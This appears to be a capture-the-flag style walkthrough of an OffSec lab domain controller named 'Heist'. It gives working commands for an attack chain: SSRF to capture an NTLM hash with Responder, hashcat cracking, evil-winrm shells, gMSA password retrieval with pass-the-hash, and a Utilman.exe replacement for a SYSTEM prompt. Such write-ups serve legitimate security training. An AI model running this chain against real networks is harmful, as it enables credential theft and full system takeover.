# Heist: Machine Notes

## Recon

### Nmap
- **AD Ports**: 53, 88, 135, 139, 389, 445, 464, 593, 3389, 5985
- **Web Port**: 8080 (Werkzeug httpd 2.0.1 / Python 3.9.0)
- **Domain**: `heist.offsec`
- **Host**: `DC01`

### Web Enumeration
- Application: "Super Secure Web Browser"
- Vulnerability: **SSRF** via a search/URL input field.
- Testing: Navigating to `http://172.10.10.10:445` (Attacker IP) triggers a connection.

---

## Initial Access

### SSRF to NTLM Capture (Responder)
1. **Start Responder**:
   ```bash
   sudo responder -I tun0 -wv
   ```
2. **Trigger Request**:
   In the web interface URL bar, enter: `http://172.10.10.10`
3. **Result**: Captured NTLMv2 hash for user `HEIST\enox`.
4. **Cracking**:
   ```bash
   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
   # Result: california
   ```

### Initial Shell
- **Evil-WinRM**:
  ```bash
  evil-winrm -i 10.10.10.10 -u enox -p california
  ```

---

## Lateral Movement

### gMSA Password Retrieval
1. **Enumeration**:
   `enox` is in the `Web Admins` group.
   `svc_apache` is a Group Managed Service Account (gMSA).
2. **Check Rights** (PowerView):
   ```powershell
   Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties PrincipalsAllowedToRetrieveManagedPassword
   ```
3. **Execution**:
   Members of `Web Admins` can read the gMSA password.
   Use `GMSAPasswordReader.exe`:
   ```bash
   .\GMSAPasswordReader.exe --AccountName 'svc_apache'
   ```
4. **Result**: Obtained NTLM hash for `svc_apache$`.
5. **Shell**:
   ```bash
   evil-winrm -i 10.10.10.10 -u 'svc_apache$' -H [NTHASH]
   ```

---

## Privilege Escalation

### SeRestorePrivilege Abuse (Utilman Hijack)
1. **Check Privs**:
   `whoami /priv` shows `SeRestorePrivilege` enabled.
2. **Method**:
   This privilege allows overwriting protected system files.
3. **Exploit**:
   ```powershell
   cd C:\Windows\System32
   ren Utilman.exe Utilman.old
   copy cmd.exe Utilman.exe
   ```
4. **Trigger**:
   Connect via RDP: `xfreerdp /v:10.10.10.10`
   At the login screen, press **Windows + U** (Easy of Access icon).
5. **Result**: Prompt spawns as `NT AUTHORITY\SYSTEM`.
